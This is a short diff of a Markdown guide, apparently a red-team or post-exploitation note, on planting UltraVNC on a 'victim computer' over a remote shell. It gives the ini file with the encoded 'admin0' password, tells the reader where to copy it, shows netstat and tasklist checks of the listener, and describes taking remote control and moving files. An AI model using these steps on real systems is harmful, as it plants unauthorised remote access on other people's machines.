@@ -27,7 +27,7 @@ UltraVNC password is "**admin0**" defined in **ultravnc.ini**. The ini file cont
 
 > [ultravnc] \
 > passwd=56B6ACA18D1BA76008 \
-> passwd2=56B6ACA18D1BA76008 \
+> passwd2=56B6ACA18D1BA76008
 
 Copy the file to **"%programfiles%\uvnc"** folder on victim computer.
 
@@ -45,7 +45,7 @@ And run below command over remote shell:
 
 Check UltraVNC listen port with netstat 
 
-`netstat -ano | find "5900"`
+`netstat -ano | find "5900"`\
 `tasklist /fi "pid eq <pid>"`
 
 Run UltraVNC viewer and connect to victim computer. You can control it with mouse/keyboard or download/upload files via UltraVNC's  file manager.
